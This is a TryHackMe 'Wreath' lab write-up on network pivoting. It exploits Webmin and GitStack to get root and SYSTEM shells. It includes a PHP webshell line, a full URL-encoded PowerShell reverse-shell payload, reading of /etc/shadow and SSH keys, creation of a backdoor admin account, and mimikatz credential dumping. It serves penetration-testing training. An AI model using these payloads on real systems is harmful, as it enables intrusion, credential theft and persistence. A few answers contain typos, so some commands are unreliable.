# TryHackMe - [Wreath](https://tryhackme.com/room/wreath) Write-Up

"Learn how to pivot through a network by compromising a public facing web machine and tunnelling your traffic to access other machines in Wreath's network. (Steak limitation only for non-subscribed users)"

## Task 1: Introduction

Let's start by creating a directory for Wreath and downloading the task files which contain the tools that we need.

I would recommend getting the latest version of the tools, but the room is new... so I will be using the archive.

**Note: This is a network shared amongst hackers. Please, do not connect on your personal device.**

## Task 2: Accessing the Network

Go to the access page, click network, and download the Wreath network VPN onto your vpn.

You can run it on your VM using openvpn (must run as root).

```
sudo openvpn /path/*name*.ovpn
```

I usually move this terminal to a new workspace since I will not need it again unless experienced connection issues.

## Task 3: Backstory

Read the offer and "accept"

## Task 4: Brief

The brief leaves us with the following information.

* There are 3 machines on the network
* There is at least one public facing webserver
* There is a self-hosted git server on the network
* The git server is internal, so Thomas may have pushed sensitive information into it that we can find
* There is a PC running on the network that has antivirus installed, likely windows which we will have to evade.
* This PC is actually a repurposed server, which possibly could be exploited.
* The (assumed) Windows PC cannot be accessed directly from the webserver

The room notes to upgrade kali, always good to do when signing into your VM. Especially when joining a network.

```
sudo apt update && sudo apt upgrade
```

## Task 5: [Webserver] Enumeration

Let's go ahead and start by running an aggressive nmap scan on all ports with very verbose information and outputting the result.

```
nmap 10.200.72.200 -A -vv -p- -T4 -oA nmap-device1
```

**1) How many of the first 15000 ports are open on the target?**

* 22 - SSH Version (OpenSSH 8.0 (protocol 2.0))
* 80 - http
* 443 - https
* 9090 - closed zeus-admin
* 10000 - http (MiniServ 1.890 (Webmin httpd)

**2) What OS does Nmap think is running?**

We'll have to grab this from the server header on port 80, because we did not use -sSU for UDP.

```
http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
```

**3) Open the IP in your browser -- what site does the server try to redirect you to?**

This will not resolve, because Thomas forgot to setup a DNS.

Let's run [BurpSuite](https://portswigger.net/burp) and navigate to the IP we ran the nmap on to see where we get redirected.

```
GET / HTTP/1.1

Host: thomaswreath.thm

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
```

Forward the request, and we can see that it attempts to connect to **https://thomaswreath.thm/**

Let's add the hosts file by editing /etc/hosts as root.

```
nano /etc/hosts
10.200.72.200 thomaswreath.thm
```

Now, upon navigation to the IP we get a security risk notification.

```
Warning: Potential Security Risk Ahead

Firefox detected a potential security threat and did not continue to thomaswreath.thm. If you visit this site, attackers could try to steal information like your passwords, emails, or credit card details.
```

This is because of the TLS certificate. The box is not connected to the internet, so it cannot have a signed cert.

Advanced > Accept the Risk and Continue

Now that we can view the site, we see what is an OSINT dream for penetration testing.

Take note of information that could be useful later.

**4) Read through the text on the page. What is Thomas' mobile phone number?**

```
Address
21 Highland Court,
Easingwold,
East Riding,
Yorkshire,
England,
YO61 3QL
Phone Number
01347 822945
Mobile Number
+447821548812
Email
me@thomaswreath.thm
```

**5) Let's have a look at the highest open port. Look back at your service scan results: what server version does Nmap detect as running here?**

Looking back, we can see port 10000 was running MiniServ 1.890 (Webmin httpd).

**6) What is the CVE number for this exploit?**

Let's research this by googling the server and version.

We see a post on [Medium](https://medium.com/@foxsin34/webmin-1-890-exploit-unauthorized-rce-cve-2019-15107-23e4d5a9c3b4) by FoxSin34.

## Task 6: Exploitation

Now that we found a vulnerability, we can work on getting initial access into the server.

We must now install the exploit into our Wreath directory.

```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107 && pip3 install -r requirements.txt
```

After installation, we can run the exploit on the target!

```
./CVE-2019-15107.py 10.200.72.200
```

The exploit gives us a shell with root on the target, I went and created a reverse shell with it.

```
# whoami
root
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# shell

[*] Starting the reverse shell process
[*] For UNIX targets only!
[*] Use 'exit' to return to the pseudoshell at any time
Please enter the IP address for the shell: Tun0-IP
Please enter the port number for the shell: 5555

[*] Start a netcat listener in a new window (nc -lvnp 5555) then press enter.

[+] You should now have a reverse shell on the target
[*] If this is not the case, please check your IP and chosen port
If these are correct then there is likely a firewall preventing the reverse connection. Try choosing a well-known port such as 443 or 53                                          
# shell

[*] Starting the reverse shell process
[*] For UNIX targets only!
[*] Use 'exit' to return to the pseudoshell at any time
Please enter the IP address for the shell: 10.50.73.55
Please enter the port number for the shell: 5556

[*] Start a netcat listener in a new window (nc -lvnp 5556) then press enter.

[+] You should now have a reverse shell on the target
[*] If this is not the case, please check your IP and chosen port
If these are correct then there is likely a firewall preventing the reverse connection. Try choosing a well-known port such as 443 or 53                                          
```

```
listening on [any] 5556 ...
connect to [Tun0-IP] from (UNKNOWN) [10.200.72.200] 35108
sh: cannot set terminal process group (1906): Inappropriate ioctl for device
sh: no job control in this shell
sh-4.4# whoami
whoami
root
```

**1) What is the root user's password hash?**

Let's cat /etc/shadow

```
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
```

Looks like we get 2 SHA516 hashes.

I would attempt to crack these with John or Hashcat, but THM notes they are uncrackable (within a normal amount of time).

**2) You won't be able to crack the root password hash, but you might be able to find a certain file that will give you consistent access to the root user account through one of the other services on the box.**

Let's navigate to the root directory and look for access to the ssh without a password.

```
ls -lAh
total 5.8M
lrwxrwxrwx. 1 root root    9 Nov  7 13:39 .bash_history -> /dev/null
-rw-r--r--. 1 root root   18 May 11  2019 .bash_logout
-rw-r--r--. 1 root root  176 May 11  2019 .bash_profile
-rw-r--r--. 1 root root  176 May 11  2019 .bashrc
-rw-r--r--. 1 root root  100 May 11  2019 .cshrc
lrwxrwxrwx. 1 root root    9 Nov  7 13:55 .mysql_history -> /dev/null
-rw-------. 1 root root    0 Jan  8 22:27 .python_history
drwx------. 2 root root   80 Jan  6 03:29 .ssh
-rw-r--r--. 1 root root  129 May 11  2019 .tcshrc
-rw-------. 1 root root 1.4K Nov  7 13:38 anaconda-ks.cfg
-rwxr-xr-x. 1 root root 5.7M Mar 22 13:28 nmap-Zima.Blue
-rw-r--r--. 1 root root  968 Mar 22 13:43 scan-2-Zima.Blue
-rw-r--r--. 1 root root 1.1K Mar 22 13:30 scan-Zima.Blue
```

Using -a or -lAh we find .ssh that we can navigate to.

```
ls -lah
total 16K
drwx------. 2 root root   80 Jan  6 03:29 .
dr-xr-x---. 3 root root  260 Mar 22 13:40 ..
-rw-r--r--. 1 root root  571 Nov  7 14:05 authorized_keys
-rw-------. 1 root root 2.6K Nov  7 14:02 id_rsa
-rw-r--r--. 1 root root  571 Nov  7 14:02 id_rsa.pub
-rw-r--r--. 1 root root  172 Jan  6 03:29 known_hosts
sh-4.4# 
```

Perfect, we found the id_rsa that we can use to ssh into the server as root.

We could setup a HTTP Server to do this, but lets just cat the rsa_id, copy it to our Wreath directory, and then chmod it with 600.

### Now we have persistent access to root on the first box, time to pivot!

## Task 7: [Pivoting] What is Pivoting?

Read the information, and look at the example diagram to understand pivoting.

"Pivoting is the art of using access obtained over one machine to exploit another machine deeper in the network. It is one of the most essential aspects of network penetration testing, and is one of the three main teaching points for this room."

## Task 8: [Pivoting] High-level Overview

Read through the methods for pivoting. We got lucky with a Linux webserver, which is great for pivoting.

Use the information to answer #1.

**2) Not covered in this Network, but good to know about. Which Metasploit Framework Meterpreter command can be used to create a port forward?**

You can find a reading at [Offensive-Security](https://www.offensive-security.com/metasploit-unleashed/portfwd/)

## Task 9: [Pivoting] Enumeration

We must now decide which way we want to begin with for enumeration of the network.

* Using material found on the machine. The hosts file or ARP cache, for example.
* Using pre-installed tools.
* Using statically compiled tools.
* Using Living off the Land (LotL) techniques.
* Using local tools through a proxy.

Let's run the following enumeration commands with our shell we have.

```
arp -a
cat /etc/hosts
cat /etc/resolv.conf
nmap -h
```

We're in luck! Although we found no nmap or local DNS servers to search for potential misconfiguration, we did find more devices with ARP.

```
sh-4.4# arp -a
arp -a
ip-10-200-72-250.eu-west-1.compute.internal (10.200.72.250) at 02:c2:f2:55:55:f3 [ether] on eth0
ip-10-200-72-100.eu-west-1.compute.internal (10.200.72.100) at 02:6f:ec:ee:e9:f9 [ether] on eth0
ip-10-200-72-1.eu-west-1.compute.internal (10.200.72.1) at 02:5d:46:44:8b:25 [ether] on eth0
ip-10-200-72-150.eu-west-1.compute.internal (10.200.72.150) at 02:6d:0d:84:75:23 [ether] on eth0
```

This leaves us with 2 more devices.

* ip-10-200-72-100.eu-west-1.compute.internal (10.200.72.100) at 02:6f:ec:ee:e9:f9 [ether] on eth0
* ip-10-200-72-150.eu-west-1.compute.internal (10.200.72.150) at 02:6d:0d:84:75:23 [ether] on eth0

We currently have root of .200

The .250 is the OpenVPN server, and the .1 is part of the AWS infrastructure. So they are both out of scope.

We could also use a sweeper (this example sweeps 192.168.1.x)

```bash
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done
```

Port scanning with bash.

```bash
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

**1) What is the absolute path to the file containing DNS entries on Linux?**

We checked this earlier for potential misconfiguration.

**2) What is the absolute path to the hosts file on Windows?**

This is noted in the tryhackme reading.

**3) How could you see which IP addresses are active and allow ICMP echo requests on the 172.16.0.x/24 network using Bash?**

```bash
for i in {1..255}; do (ping -c 1 172.168.0.${i} | grep "bytes from" &); done
```

## Task 10: [Pivoting] Proxychains & Foxyproxy

[Proxychains config](https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf)

It is worth noting that we must comment out (#) proxy_dns before performing a scan or the scan will hang.

Read about Proxychains and [FoxyProxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/)(which I use often with BurpSuite).

**1) What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?**

```
socks4 127.0.0.1:4242
```

**2) What command would you use to telnet through a proxy to 172.16.0.100:23?**

```
proxychains telnet 172.16.0.100:23
```

**You have discovered a webapp running on a target inside an isolated network. You set up a proxy to gain access to the application. How do you access the proxy: Proxychains (PC) or FoxyProxy (FP)?**

Since it is a webapp, we would want to use FoxyProxy in our browser.

## Task 11: [Pivoting] SSH Tunnelling / Port Forwarding

Read about Forward Connections and Reverse Connections.

Answer the questions:

**1) If you're connecting to an SSH server from your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?**

This is local because you are connecting from your attacking machine.

**2) Which switch combination can be used to background an SSH port forward or tunnel?**

-Fn

**3) It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?**

No!

**4) What command would you use to create a pair of throwaway SSH keys for a reverse connection?**

ssh-keygen

**5) If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called id_rsa and backgrounding the shell, what command would you use? (Assume your username is "kali")**

Formatting for this:

```
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```

Answer:

```
ssh -R 2222:172.16.0.100:2222 kali@172.16.0.200 -i id_rsa -fN
```

**6) What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?**

Formatting for this:

```
ssh -D PORT user@IP -fN
```

Answer:

```
ssh -D 8000 user@target.thm -fN
```

**7) 

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.**

Formatting for this:

```
ssh -D 8000 ACCESSEDSERVERIP:80 user@internalip:port -fN
```

Answer:

```
ssh -D 8000 172.16.0.50:80 user@127.0.0.1:80 -fN
```

## Task 12: [Pivoting] plink.exe

Read about plink and puttygen to answer the question.

## Task 13: [Pivoting] Socat

Read about Socat's Reverse Shell Relays, and Port Forwarding then use the information to answer #1.

**2) If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?**

Use TCP port 8000 for the server listener, and do not background the process.

```
./socat tcp-l:8000 tcp:172.16.0.200:443
```

**What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?**

```
./socat tcp-1:2222,fork,reuseaddr tcp:172.16.0.100:22 &
```

You can look at the room on [shells](https://tryhackme.com/room/introtoshells) to create an encrypted port forward or relay using OPENSSL with socat.

## Task 14: [Pivoting] [Chisel](https://github.com/jpillora/chisel)

Read about Chisel and it's Reverse/Forward SOCKS Proxy and Remote\Local Port Forward.

**1) What command would you use to start a chisel server for a reverse connection on your attacking machine? Use port 4242 for the listener and do not background the process.**

Formatting:

```
./chisel server -p LISTEN_PORT --reverse
```

Answer:

```
./chisel server -p 4242 --reverse
```

**2) What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?**

Formatting:

```
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

Answer:

```
./chisel client 172.16.0.200:4242 R:socks &
```

**3) How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.**

Formatting:

```
./chisel client FORWARDIP:FORWARDPORT R:OWNPORT:OWNIP:LISTENINGPORT &
```

Answer:

```
./chisel client 172.16.0.20:3306 R:33060:172.16.0.200:1337 &
```

**4) If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?**

Formatting:

```
./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
```

Answer:

```
./chisel client 172.16.0.5:4444 8000:172.16.0.10:80
```

## Task 15: [Pivoting] [sshuttle](https://github.com/sshuttle/sshuttle)

Read about sshuttle.

**1) How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16**

Formatting:

```
sshuttle -r username@address subnet
```

Answer:

```
sshuttle -r pwned@172.16.20.7 172.16.0.0/16
```

**2) What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?**

Formatting:

```
--ssh-cmd "ssh -i KEYFILE"
```

```
--ssh-cmd "ssh -i priv_key"
```

**3) You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error. What switch (and argument) could you use to fix this error?**

```
-x 172.16.0.100
```

## Task 16: [Pivoting] Conclusion

Well, overall that was a lot of information and I'd recommend testing with the tools to better understand them. This network is a great free sandbox.

Main points from the Pivoting section on the different methods.

* Proxychains and FoxyProxy can be used to access a created proxy through one of the tools.
* SSH is great for creating port forwards and proxies.
* plink.exe is an SSH client for Windows, allowing the creation of reverse SSH connections for Windows.
* Socat is useful for redirecting connections, and can be implemented to establish port forwards multiple ways.
* Chisel can do the same as with SSH portforwarding/tunneling, but it doesn't require SSH access to do so.
* sshuttle is a simple way to create a proxy when we have SSH access on a target

## Task 17: [Git Server] Enumeration

Although we found the 2 other devices earlier with arp -a, we will install a [static nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true) on the server for enumeration since tryhackme instructs to do this.

Let's start by connecting with our id_rsa we took.

```
ssh -i id_rsa root@10.200.72.200     
The authenticity of host '10.200.72.200 (10.200.72.200)' can't be established.
ECDSA key fingerprint is SHA256:THDwSEv1rb9SXkMf4HfQREF1FvH2GtKfaBzVlSsYnuM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.200.72.200' (ECDSA) to the list of known hosts.
[root@prod-serv ~]# whoami
root
``` 

**1) Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?**

We know that this is 2 previously, but install nmap to check if it finds any new hosts.

I used a python3 httpserver on port 80 and then curled the static nmap from the target.

Attack Source:

```
sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.200.72.200 - - [23/Mar/2021 18:11:36] "GET /nmap HTTP/1.1" 200 -
```

Target:

```
curl Tun0-IP/nmap-USERNAME -o /tmp/nmap-USERNAME && chmod +x /tmp/nmap-USERNAME
```

Let's go ahead and navigate to /tmp/ then run the binary to scan the network only for online hosts and not ports.

```
./nmap-USERNAME -sn 10.200.72.1-255 -vv
```

We confirm, there are 2 other hosts we can spread to.

**2) In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)**

150,100

**3) Scan the hosts -- which one does not return a status of "filtered" for every port (submit the last octet only)?**

Using our static nmap binary, we can scan the hosts

```
./nmap-USERNAME -p- -vv 10.200.72.150
```

**4) Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?**

150 returns the following ports, and tryhackme says to assume the other is inaccessible from current position, so we do not have to scan .100.

```
PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5357/tcp  open  wsdapi        syn-ack ttl 128
5985/tcp  open  wsman         syn-ack ttl 128
15555/tcp open  cisco-snat    syn-ack ttl 128
47000/tcp open  mbus          syn-ack ttl 128
50001/tcp open  unknown       syn-ack ttl 128
```

I'm going to guess that 50001 port is someone elses' shell in the network.

Since tryhackme notes to ignore 5356, we will exclude that from our answer.

**5) Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?**

It is most likely that the http server has a vulnerability.

## Task 18: [Git Server] Pivoting

Now, we need to select a pivoting technique to connect to the service with our FoxyProxy on our attacking device.

I am going to be using sshuttle, since we already have a keyfile(id_rsa) to use.

```
sudo apt install sshuttle
```

After installing sshuttle, we must first authenticate with the server.

```
sshuttle -r root@10.200.72.200 --ssh-cmd "ssh -i id_rsa" 10.200.72.0/24 -x 10.200.72.200
c : Connected to server.
```

Once we are connected, we can navigate using FoxyProxy. Set the FoxyProxy to 10.200.72.150 and navigate to it.

We get the following error:

```
Page not found (404)
Request Method: 	GET
Request URL: 	http://10.200.72.150/

Using the URLconf defined in app.urls, Django tried these URL patterns, in this order:

    ^registration/login/$
    ^gitstack/
    ^rest/

The current URL, , didn't match any of these.

You're seeing this error because you have DEBUG = True in your Django settings file. Change that to False, and Django will display a standard 404 page.
```

**1) What is the name of the program running the service?**

From the error we can see that there is both a registration/login/ and the program running the service, gitstack/

Let's go ahead and navigate to the /gitstack/.

```
http://10.200.72.150/registration/login/?next=/gitstack/
```

We get redirected to the login page with the following information.

```
Default username/password : admin/admin 
```

Let's give them a try and see if they work.

No luck, but worth a shot. Let's go ahead and inspect the source real quick to try and find the gitstack version.

Nothing found there either. Let's run searchsploit on gitstack to see what we find.

```
searchsploit gitstack
------------------------------------------------------- ---------------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------------
GitStack - Remote Code Execution                       | php/webapps/44044.md
GitStack - Unsanitized Argument Remote Code Execution  | windows/remote/44356.rb
GitStack 2.3.10 - Remote Code Execution                | php/webapps/43777.py
------------------------------------------------------- ---------------------------------
```

We're in luck it looks like there are 3 exploits for GitStack, let's look into them on [Exploit-DB](https://www.exploit-db.com/).

**2) There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?**

```
GitStack 2.3.10 - Remote Code Execution                | php/webapps/43777.py
```

So we will be using exploit [43777](https://www.exploit-db.com/exploits/43777).

## Task 19: [Git Server] Code Review

Alright, let's start by making a copy of the exploit in our local directory.

```
searchsploit -m 43777
```

Local exploit copies use DOS line endings, so we will have to convert to linux using dos2unix.

```
dos2unix ./43777.py
```

**1) Look at the information at the top of the script. On what date was this exploit written?**

Now we can read the script, let's take a look.

```py
# Date: 18.01.2018
```

**2) is the script written in Python2 or Python3?**

We must check for print ("example") to determine if python2 or python3. Python2 will not include ().

```py
print "[+] Get user list"
```

We can see from the formatting that this is python2.

Let's go ahead and add a shebang to the first line of the exploit.

```py
#!/usr/bin/python2
```

Now we can execute without having to say python2 before the script. First though, let's configure the exploit for usage.

```py
ip = '192.168.1.102'

# What command you want to execute
command = "whoami"
```

Whoami will work for testing, we want to switch the ip to our target we are exploiting.

```py
print "[+] Create backdoor in PHP"
r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit.php'))
print r.text.encode(sys.stdout.encoding, errors='replace')

print "[+] Execute command"
r = requests.post("http://{}/web/exploit.php".format(ip), data={'a' : command})
print r.text.encode(sys.stdout.encoding, errors='replace')
```

We can see that the exploit will also create a shell for us, switch the exploit.php to exploit-USERNAME.php in both requests since this is a network.

**1) What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit?**

```
r = requests.post("http://{}/rest/repository/".format(ip), cookies={'csrftoken' : csrf_token}, data={'name' : repository, 'csrfmiddlewaretoken' : csrf_token})
```

We can find the cookie set.

## Task 20: [Git Server] Exploitation

Now that we have found and modified our exploit, it's time to attack.

```
./43777.py              
[+] Get user list
[+] Found user twreath
[+] Web repository already enabled
[+] Get repositories list
[+] Found repository Website
[+] Add user to repository
[+] Disable access for anyone
[+] Create backdoor in PHP
Your GitStack credentials were not entered correcly. Please ask your GitStack administrator to give you a username/password and give you access to this repository. <br />Note : You have to enter the credentials of a user which has at least read access to your repository. Your GitStack administration panel username/password will not work. 
[+] Execute command
"nt authority\system
" 
```

### Win! Not only did the shell execute, it is spawned as nt authority\system!

We now have two options here.

* Change the command in the exploit and re-run what we want.
* Leverage the webshell to execute more commands.

I'm going to pick option 2 because it is much quieter.

If we want, we can curl the shell using -d.

```
curl -X POST http://10.200.72.150/web/exploit-USERNAME.php -d "a=COMMANDTOLAUNCH"
```

There is also the option of [BurpSuite](https://portswigger.net/burp)

* Turn on intercept in Proxy section for BurpSuite.
* Turn on FoxyProxy linked to BurpSuite.
* Navigate to http://10.200.72.150.
* Send to Repeater with Ctrl + R.
* Modify the GET /web/exploit-USERNAME.php to POST /web/exploit-USERNAME.php.
* Add Content-Type header so the server accepts post requests.

```
Content-Type: application/x-www-form-urlencoded
```

* Add a=COMMANDTOLAUNCH to line 11

Send and the response will come back from the web shell. We could modify this exploit for a full pseudoshell environment, but the one we have is just fine for now.

**1) What is the hostname for this target?**

```
curl -X POST http://10.200.72.150/web/exploit-USERNAME.php -d "a=hostname"
"git-serv
"
```

**2) What operating system is this target?**

We are unsure if this is Windows or Linux, so we will run systeminfo && uname.

```
curl -X POST http://10.200.72.150/web/exploit-USERNAME.php -d "a=systeminfo & uname"

Systeminfo worked and returned this:
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
```

**3) What user is the server running as?**

This was already the default run when testing the exploit.

Before we attempt to establish a reverse shell, we must check to determine if the target can connect to our device.

Start a TCPDump listener on your VM:

```
tcpdump -i tun0-IP icmp
```

Attempt to ping yourself with 3 ICMP packets from the webshell:

```
ping -n 3 tun0-IP
```

**4) How many make it to the waiting listener?**

Unfortunately, none ping back so we will have to think of another way to reverse the connection.

Now we have two options again. We could upload a static netcat copy or set up a relay on .200 using socat.

I will be using [socat](https://www.redhat.com/sysadmin/getting-started-socat) (see Task #13) for experience because I have never used it to forward a shell back to a listener before.

However, there is something we must do first because CentOS uses an always-on wrapper called firewalld. This firewall only allows access to anything specified by the system admin.

Due to this, we will need to open our desired port (I will use 37834) in the firewall.

* Set zone to public
* Establish a port (above 15000 because that is what new room users will be scanning)
* Set the protocol to TCP

```
firewall-cmd --zone=public --add-port 30603/tcp
success
```

Now that we have opened the port in the firewall, we can transfer a netcat binary onto the compromised web server.

Start a http server on your VM (make sure the directory you start you server in contains the binary).

```
python3 -m http.server 80
```

Next, we cURL the binary from our ssh session and make it an executable.

```
curl tun0-IP/nc -o ./nc-USERNAME & chmod +x ./nc-USERNAME
```

Now we can open a listener on the port that we opened in the firewall.

```
./nc-USERNAME -lvnp 30603
```

Time to go for a reverse shell on the device, let's go into BurpSuite and grab a repeater for 10.200.72.150/web/exploit-USERNAME.php.

* Modify like we did previously and add a powershell to create a reverse shell.
* Adjust the IP and Port (10.200.72.200,30603)
* Use CTRL-U to URL-encode the shell command.

```
POST /web/exploit-USERNAME.php HTTP/1.1

Host: 10.200.72.150

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: close

Cookie: csrftoken=lcywMkTG91NfRDIvR5VxWd1DB3JaJ7Rp; sessionid=0cabb9edc4c9612c71e3c3e44f2a3020

Content-Type: application/x-www-form-urlencoded

Upgrade-Insecure-Requests: 1

Content-Length: 12



a=powershell.exe+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('10.200.72.200',30603)%3b$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0)3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()"
```

Now let's go ahead and hit send to get our reverse shell!

### Win! We now have a shell on 2 of the devices in the network!

```
./nc-USERNAME -lvnp 30603
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat )
Ncat: Listening on :::30603
Ncat: Listening on 0.0.0.0:30603
Ncat: Connection from 10.200.72.150.
Ncat: Connection from 10.200.72.150:50456.
whoami
nt authority\system
PS C:\GitStack\gitphp> 
```

## Task 21: [Git Server] Stabilisation & Post Exploitation

Since we have RCE as system, there is no need for privilege escalation.

Instead, we want to consolidate our position incase we lose the netcat session.

Let's get a user account with the "Remote Desktop Users' group for RDP or "Remote Management Users" group for WINRM. Since earlier we saw both 3389 (RDP) and 5985 (WINRM) open.

This will be easy since we are system, we can just create an account.

### DO NOT USE A PASSWORD FOR THIS YOU USE ANYWHERE ELSE! This is a open network haha.

```
net user USERNAME PASSWORD /add
net localgroup Administrators USERNAME /add
net localgroup "Remote Management Users" USERNAME /add
PS C:\GitStack\gitphp> net user USERNAME
User name                    USERNAME
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            25/03/2021 03:26:34
Password expires             Never
Password changeable          25/03/2021 03:26:34
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
                             *Users                
Global Group memberships     *None                 
The command completed successfully.

```

I selected WinRM because of the cool tool [evil-winrm](https://github.com/Hackplayers/evil-winrm).

Also, RDP might be laggy on a network due to memory limitations on the target.

Save your credentials you used to create your account somewhere on your VM.

Finally, let's get a stable CLI shell using evil-winrm.

```
evil-winrm -i 10.200.72.150 -u USERNAME -p PASSWORD                         

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\USERNAME\Documents> 
```

Notes on RDP:

xfreerdp is very useful.

```
sudo apt install freerdp2-x11
```

Connection:

```
xfreerdp /v:IP /u:USERNAME /p:PASSWORD
```

Useful commands:

```
/dynamic-resolution - allows resizing of window and adjusts resolution
/size:WIDTHxHEIGHT - set specific size for targets
+clipboard - enables clipboard support
/drive:LOCAL_DIRECTORY,SHARE_NAME - create shared drive between attack source and target
```

Let's use xfreerdp to get a share drive with the target and launch mimikatz to get users hashes with an lsass dump.

```
xfreerdp /v:10.200.72.150 /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share
```

Now that we have created an RDP session, we should give ourselves debug privileges and escalate to system to run an lsadump using mimikatz from our shared folder.

```
C:\Windows\system32>\\tsclient\share\mimikatz\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

672     {0;000003e7} 1 D 20128          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;0007f416} 2 F 1092103     GIT-SERV\USERNAME     S-1-5-21-3335744492-1614955177-2693036043-1002
(15g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 1309425     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz # lsadump::sam
Domain : GIT-SERV
SysKey : 0841f6354f4b96d21b99345d07b66571
Local SID : S-1-5-21-3335744492-1614955177-2693036043

